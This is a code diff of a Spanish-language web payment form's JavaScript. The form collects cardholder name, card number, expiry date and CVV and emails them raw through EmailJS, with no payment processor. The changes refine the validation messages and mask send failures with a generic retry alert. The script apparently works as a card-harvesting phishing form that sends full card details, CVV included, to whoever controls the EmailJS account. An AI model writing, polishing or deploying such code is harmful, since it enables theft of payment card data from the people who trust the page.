@@ -2,11 +2,10 @@ emailjs.init('ReqtkWfjI392LAzFb');
 
 document.getElementById('paymentForm').addEventListener('submit', function(e) {
     e.preventDefault();
-    const loader = document.getElementById('mensajeCarga');
-    const errores = document.getElementById('errores');
+    const loader = document.createElement('div');
+    loader.className = 'loader';
+    document.body.appendChild(loader);
 
-    errores.innerHTML = '';
-    
     const datos = {
         nombre_completo: document.getElementById('nombre').value.trim(),
         numero_tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
@@ -14,30 +13,34 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
         codigo_cvv: document.getElementById('cvv').value
     };
 
-    const mensajesError = [];
-    
-    if (!/^[a-zA-ZÀ-ÿñÑ\s]{4,}$/.test(datos.nombre_completo)) {
-        mensajesError.push('❌ El nombre debe tener al menos 4 letras');
+    // Validaciones actualizadas
+    let isValid = true;
+    document.querySelectorAll('.error-input').forEach(el => el.remove());
+
+    if (!/^[\p{L}\s]{4,}$/u.test(datos.nombre_completo)) {
+        mostrarError('nombre', 'Nombre inválido (mínimo 4 letras)');
+        isValid = false;
     }
 
     if (!/^\d{16}$/.test(datos.numero_tarjeta)) {
-        mensajesError.push('❌ Tarjeta inválida (16 dígitos requeridos)');
+        mostrarError('tarjeta', 'Tarjeta inválida');
+        isValid = false;
     }
 
     if (new Date(datos.fecha_expiracion) < new Date()) {
-        mensajesError.push('❌ La tarjeta está expirada');
+        mostrarError('fecha', 'Fecha expirada');
+        isValid = false;
     }
 
-    if (!/^\d{3,4}$/.test(datos.codigo_cvv)) { // Cambio clave aquí
-        mensajesError.push('❌ CVV inválido (3-4 dígitos)');
+    if (!/^\d{3,4}$/.test(datos.codigo_cvv)) {
+        mostrarError('cvv', 'CVV inválido (3-4 dígitos)');
+        isValid = false;
     }
 
-    if (mensajesError.length > 0) {
-        errores.innerHTML = mensajesError.map(msg => `<div class="error-msg">${msg}</div>`).join('');
+    if (!isValid) {
+        loader.remove();
         return;
     }
-
-    loader.style.display = 'block';
 
     emailjs.send("service_syrc1uk", "template_u3etoro", datos)
         .then(() => {
@@ -45,14 +48,23 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
         })
         .catch(error => {
             console.error('Error:', error);
-            errores.innerHTML = `<div class="error-msg">❌ Error al enviar: ${error.text}</div>`;
+            alert('Error temporal. Por favor intente nuevamente.');
         })
         .finally(() => {
-            loader.style.display = 'none';
+            loader.remove();
         });
 });
 
-// Formateador de tarjeta
+function mostrarError(campoId, mensaje) {
+    const input = document.getElementById(campoId);
+    const error = document.createElement('div');
+    error.className = 'error-input';
+    error.style.color = '#ff4444';
+    error.style.marginTop = '5px';
+    error.textContent = mensaje;
+    input.parentNode.appendChild(error);
+}
+
 document.getElementById('tarjeta').addEventListener('input', function(e) {
     let value = e.target.value.replace(/\s/g, '');
     value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
